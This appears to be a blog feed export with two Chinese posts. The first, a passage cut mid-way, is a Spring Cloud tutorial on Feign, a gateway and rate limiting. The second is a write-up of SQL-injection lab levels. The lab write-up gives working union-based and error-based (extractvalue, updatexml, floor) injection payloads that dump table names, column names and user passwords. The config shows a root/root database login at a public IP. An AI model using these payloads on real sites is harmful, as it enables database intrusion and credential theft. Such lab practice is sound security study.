                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span>
</code></pre>
</li>
<li><p>application.yaml</p>
<pre><code class="hljs yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9001</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">user-check</span>

  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://81.68.252.36:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">root</span>

<span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
<span class="hljs-comment">#      table-prefix: tbl_</span>
      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>
  <span class="hljs-attr">configuration:</span> <span class="hljs-comment"># 设置mybatisplus的日志为标准输入格式 可以显示执行的sql语句、携带的参数与查询结果</span>
    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span>
<span class="hljs-attr">eureka:</span>
  <span class="hljs-attr">client:</span>
    <span class="hljs-attr">service-url:</span>
      <span class="hljs-attr">defaultZone:</span> <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre>
</li>
<li><p>在启动类中添加注释<code>@EnableDiscoveryClient</code></p>
</li>
<li><p>service和dao层代码与之前写内容基本一致</p>
</li>
<li><p>在api-user-login模块中调用user-check</p>
<ul>
<li><p>创建UserCheckClient</p>
<pre><code class="hljs java"><span class="hljs-meta">@FeignClient(value = &quot;user-check&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserCheckClient</span> </span>&#123;

    <span class="hljs-meta">@GetMapping(&quot;user/check&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> Users <span class="hljs-title">userCheck</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username,<span class="hljs-meta">@RequestParam(&quot;password&quot;)</span> String password)</span></span>;
&#125;</code></pre>

<p>其中<code>@FeignClient(value = &quot;user-check&quot;)</code>中的value要与注册到eureka中服务名相同，<code>@GetMapping(&quot;user/check&quot;)</code>要与user-check的controller中的访问路径相同。</p>
<p>方法名也要与controller中的方法相同。并且在有多个参数的情况下需要在每个参数前加上<code>@RequestParam(&quot;username&quot;)</code>，否则fegin调用时，会将所有的参数当成post方式的请求体，从而报错。</p>
<pre><code class="hljs less"><span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">Users</span> <span class="hljs-selector-tag">userCheck</span>(<span class="hljs-variable">@RequestParam</span>(<span class="hljs-string">&quot;username&quot;</span>) String username,<span class="hljs-variable">@RequestParam</span>(<span class="hljs-string">&quot;password&quot;</span>) String password);</code></pre>
</li>
<li><p>api-user-login在service中进行服务调用即可</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.api.service.impl;

<span class="hljs-keyword">import</span> com.qfedu.api.service.UserService;
<span class="hljs-keyword">import</span> com.qfedu.api.service.fegin.UserCheckClient;
<span class="hljs-keyword">import</span> com.qfedu.fmmall.beans.Users;
<span class="hljs-keyword">import</span> com.qfedu.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserService</span> </span>&#123;

    <span class="hljs-meta">@Qualifier(&quot;com.qfedu.api.service.fegin.UserCheckClient&quot;)</span>
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserCheckClient userCheckClient;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">checkLogin</span><span class="hljs-params">(String username, String password)</span> </span>&#123;
        <span class="hljs-comment">// 调用另外一个服务从数据库中查询到用户信息</span>
        Users users = userCheckClient.userCheck(username, password);
        <span class="hljs-keyword">if</span>(users == <span class="hljs-keyword">null</span>) &#123;
            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;密码错误！&quot;</span>);
        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;null&quot;</span>.equals(users.getNickname()))&#123;
            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;用户名不存在！&quot;</span>);
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> ResultVO.success(users);
        &#125;
    &#125;
&#125;
</code></pre>



</li>
</ul>
</li>
</ul>
<h3 id="搭建gateway"><a href="#搭建gateway" class="headerlink" title="搭建gateway"></a>搭建gateway</h3><ul>
<li><p>创建gateway服务模块</p>
</li>
<li><p>pom文件内容</p>
<pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;
&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;2.6.2&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;com.qfedu&lt;/groupId&gt;
    &lt;artifactId&gt;gateway&lt;/artifactId&gt;
    &lt;version&gt;2.1.1&lt;/version&gt;
    &lt;name&gt;gateway&lt;/name&gt;
    &lt;description&gt;Demo project for Spring Boot&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;1.8&lt;/java.version&gt;
        &lt;spring-cloud.version&gt;2021.0.3&lt;/spring-cloud.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
            &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;io.projectreactor&lt;/groupId&gt;
            &lt;artifactId&gt;reactor-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
    &lt;dependencyManagement&gt;
        &lt;dependencies&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;
                &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;
                &lt;type&gt;pom&lt;/type&gt;
                &lt;scope&gt;import&lt;/scope&gt;
            &lt;/dependency&gt;
        &lt;/dependencies&gt;
    &lt;/dependencyManagement&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;
</code></pre>
</li>
<li><p>在application.yml中配置相关信息</p>
<pre><code class="hljs yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-service</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">http://127.0.0.1:8001</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/login</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-service</span>
            <span class="hljs-attr">uri:</span> <span class="hljs-string">http://127.0.0.1:8002</span>
            <span class="hljs-attr">predicates:</span>
              <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/regist</span>
</code></pre>
</li>
<li><p>实现全局过滤器</p>
<blockquote>
<p>当用户访问8000端口时，所有的请求都会被该过滤器拦截</p>
<p>因此全局过滤器可以进行权限验证</p>
</blockquote>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.gateway.filter;

<span class="hljs-keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;
<span class="hljs-keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;
<span class="hljs-keyword">import</span> org.springframework.core.Ordered;
<span class="hljs-keyword">import</span> org.springframework.http.HttpStatus;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> org.springframework.web.server.ServerWebExchange;
<span class="hljs-keyword">import</span> reactor.core.publisher.Mono;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyGlobalFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">GlobalFilter</span>, <span class="hljs-title">Ordered</span> </span>&#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> Mono&lt;Void&gt; <span class="hljs-title">filter</span><span class="hljs-params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> </span>&#123;
        System.out.println(<span class="hljs-string">&quot;-------------------&quot;</span>);
        System.out.println(<span class="hljs-string">&quot;进入全局过滤器&quot;</span>);
        List&lt;String&gt; token = exchange.getRequest().getHeaders().get(<span class="hljs-string">&quot;token&quot;</span>);

        <span class="hljs-keyword">if</span>(token != <span class="hljs-keyword">null</span> &amp;&amp; token.size() &gt; <span class="hljs-number">0</span>)&#123;
            <span class="hljs-comment">// 对token进行验证，如果验证通过则放行本次拦截</span>
            <span class="hljs-keyword">return</span> chain.filter(exchange);
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-comment">// 验证不通过，则返回对应的状态码</span>
            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);
            <span class="hljs-comment">// 拦截请求</span>
            <span class="hljs-keyword">return</span> exchange.getResponse().setComplete();
        &#125;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getOrder</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    &#125;
&#125;</code></pre>
</li>
<li><p>动态路由配置</p>
<blockquote>
<p>使用服务注册与发现实现动态路由</p>
</blockquote>
<ul>
<li><p>将gateway服务模块加入到eureka中，即添加依赖添加配置文件</p>
<pre><code class="hljs properties"><span class="hljs-attr">eureka</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">client</span>:<span class="hljs-string"></span>
    <span class="hljs-meta">service-url</span>:<span class="hljs-string"></span>
      <span class="hljs-attr">defaultZone</span>: <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre>
</li>
<li><p>使用注册到eureka中的服务名替换ip地址</p>
<blockquote>
<p>lb代表使用负载均衡模式，默认策略时轮询</p>
</blockquote>
<pre><code class="hljs yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway</span>

  <span class="hljs-attr">main:</span>
    <span class="hljs-attr">web-application-type:</span> <span class="hljs-string">reactive</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-login</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://api-user-login</span>
          <span class="hljs-comment">#uri: http://127.0.0.1:8001</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/login</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-regist</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://api-user-regist</span>
          <span class="hljs-attr">predicates:</span>
             <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/regist</span>
<span class="hljs-attr">eureka:</span>
  <span class="hljs-attr">client:</span>
    <span class="hljs-attr">service-url:</span>
      <span class="hljs-attr">defaultZone:</span> <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre>

</li>
</ul>
</li>
</ul>
<h3 id="Gateway限流"><a href="#Gateway限流" class="headerlink" title="Gateway限流"></a>Gateway限流</h3><blockquote>
<p>基于令牌桶实现的网关限流，使用redis作为桶结合过滤器实现限流</p>
</blockquote>
<ul>
<li><p>添加依赖</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis-reactive<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-pool2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
</li>
<li><p>配置application.yml</p>
<pre><code class="hljs yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway</span>

  <span class="hljs-attr">main:</span>
    <span class="hljs-attr">web-application-type:</span> <span class="hljs-string">reactive</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-login</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">http://127.0.0.1:8001</span>
<span class="hljs-comment">#          uri: lb://api-user-login</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/login</span>
           <span class="hljs-comment">#限流策略配置</span>
          <span class="hljs-attr">filters:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">RequestRateLimiter</span>
              <span class="hljs-attr">args:</span>
                <span class="hljs-attr">redis-rate-limiter.replenishRate:</span> <span class="hljs-number">1</span> <span class="hljs-comment">#令牌桶每s的填充速度</span>
                <span class="hljs-attr">redis-rate-limiter.burstCapacity:</span> <span class="hljs-number">2</span> <span class="hljs-comment"># 令牌桶容量</span>
                <span class="hljs-attr">redis-rate-limiter.requestedTokens:</span> <span class="hljs-number">1</span>
                <span class="hljs-attr">key-resolver:</span> <span class="hljs-string">&quot;#&#123;@keyResolver&#125;&quot;</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-regist</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://api-user-regist</span>
          <span class="hljs-attr">predicates:</span>
             <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/regist</span>
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span>
    <span class="hljs-attr">database:</span> <span class="hljs-number">0</span>
    <span class="hljs-attr">password:</span>
<span class="hljs-comment">#    lettuce:</span>
<span class="hljs-comment">#      pool:</span>
<span class="hljs-comment">#        max-active: 10</span>
<span class="hljs-comment">#        max-wait: 1000</span>
<span class="hljs-comment">#        max-idle: 5</span>
<span class="hljs-comment">#        min-idle: 3</span>
<span class="hljs-attr">eureka:</span>
  <span class="hljs-attr">client:</span>
    <span class="hljs-attr">service-url:</span>
      <span class="hljs-attr">defaultZone:</span> <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre>
</li>
<li><p>配置keyResolver</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.gateway.config;

<span class="hljs-keyword">import</span> org.springframework.cloud.gateway.filter.ratelimit.KeyResolver;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> reactor.core.publisher.Mono;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppConfig</span> </span>&#123;
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> KeyResolver <span class="hljs-title">keyResolver</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-comment">//http://localhost:9999/order/query?user=1</span>
        <span class="hljs-comment">//使⽤请求中的user参数的值作为令牌桶的key</span>
        <span class="hljs-comment">//return exchange -&gt;Mono.just(exchange.getRequest().getQueryParams().getFirst(&quot;user&quot;));</span>
        <span class="hljs-keyword">return</span> exchange -&gt;
                Mono.just(exchange.getRequest().getURI().getPath());
    &#125;
&#125;</code></pre>

</li>
</ul>
<p>当用户访问的速度超过了令牌的产生速度时就会无法访问，返回429的状态码</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220731190403002.png" alt="image-20220731190403002"></p>
]]></content>
  </entry>
  <entry>
    <title>net_a_and_d</title>
    <url>/2021/03/03/net-a-and-d/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>get提交参数id</p>
<p>首先提交<code>1&#39;</code>，判断是字符型还是数字型注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223925654.png" alt="image-20210130223925654"></p>
<p>这里出现报错，说明是字符类型的，并且是用<code>&#39;</code>将参数id包裹起来的。</p>
<p>接下来就是判断列数，爆表名，爆列名和数据库内容</p>
<p><strong>0x1 确定列数并爆出表名</strong></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130213104147.png" alt="image-20210130213104147"></p>
<p>当列数增加到4的时候开始报错，说明是三列</p>
<pre><code class="hljs q">?id=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()--+</code></pre>

<p><img src="https://i.loli.net/2021/01/30/KtISlB9Wd4mreqF.png" alt="image-20210130213358017.png"></p>
<p><strong>0x2 爆列名</strong></p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+</code></pre>

<p>这里的列名很多</p>
<pre><code class="hljs pgsql">user_id,first_name,last_name,<span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span>,avatar,last_login,failed_login</code></pre>

<p><strong>0x3 爆出内容</strong></p>
<p>选择password</p>
<pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+ </span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130213751401.png" alt="image-20210130213751401"></p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>同样使用 <code>id=1&#39;</code>，判断是什么类型的注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130214135139.png" alt="image-20210130214135139"></p>
<p>可以发现输入的<code>&#39;</code>没有其他的<code>&#39;</code>与之闭合，导致报错，所以这是数字型注入</p>
<p>所以可以直接使用level1的注入语句，只需要删除 ‘ 即可</p>
<pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+ </span>

?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+ </span>

?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+ </span></code></pre>

<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>提交<code>id=1&#39;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130214628110.png" alt="image-20210130214628110"></p>
<p>分析一下报错原因</p>
<p>出错的语句为</p>
<pre><code class="hljs 1c">&#x27;1&#x27;&#x27;) LIMIT 0,1</code></pre>

<p>其中<strong style="color:orange;">1’</strong>输入的内容，所以包裹参数的格式为<code>(&#39;id&#39;)</code></p>
<p>注入语句可以直接在level1的基础上增加一个 )即可</p>
<p>将原语句修改为</p>
<pre><code class="hljs ada"><span class="hljs-string">&#x27;1&#x27;</span>) 注入语句 <span class="hljs-comment">--+ &#x27;) LIMIT 0,1 </span></code></pre>

<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()--+ 

?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+ 

?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(password),3 <span class="hljs-keyword">from</span> users--+</code></pre>

<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>同样输入<code>id=1&#39;</code>，但是这次没有报错，才是是使用了<code>&quot;</code>，换成<code>id=1&quot;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130215456338.png" alt="image-20210130215456338"></p>
<p>很明显和level3基本相同，将<code>&#39;</code>改为<code>&quot;</code>，就是这关的答案</p>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>这题是字符型注入，但是不在回显所查询的内容，所以是盲注</p>
<p>查看源码也可以发现</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130220440238.png" alt="image-20210130220440238" style="zoom:50%;">

<p>不在打印出所查询到的内容，所以是盲注，但是这关没有关闭报错回显，所以可以通过报错注入</p>
<p><strong>报错注入</strong></p>
<p><span style="background-color:yellow"><strong>(1). 通过floor报错</strong></span></p>
<p>and (select 1 from (select count(<em>),concat((payload) from users limit 0,1),floor (rand(0)</em>2))x from information_schema.tables group by x)a)</p>
<p>其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符</p>
<p><span style="background-color:yellow"><strong>(2). 通过updatexml报错</strong></span></p>
<p>and updatexml(1,payload,1)</p>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
<p><span style="background-color:yellow"><strong>(3). 通过ExtractValue报错</strong></span></p>
<p>and extractvalue(1, payload)</p>
<p>输出字符有长度限制，最长32位。</p>
<p><strong>0x1 确定数据库名</strong></p>
<pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x23</span>,database(),<span class="hljs-number">0x23</span>))<span class="hljs-comment">--+</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130221306917.png" alt="image-20210130221306917"></p>
<p><strong>0x2 爆表名</strong></p>
<pre><code class="hljs n1ql">?id=1&#x27; and extractvalue(1,concat(0x23,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x23</span>))--+</code></pre>

<p>这里每次报错显示的信息只有一行，所以只能有 limit，一个一个的显示，直到找到目标表名</p>
<p><strong>0x3 爆列名</strong></p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> extractvalue(1,concat(0x23,(select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> limit 1,1),0x23))--+</code></pre>

<p><strong>0x4 爆内容</strong></p>
<pre><code class="hljs mysql">?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+</code></pre>

<p>后面的内容可以通过改变limit后的第一个参数查看</p>
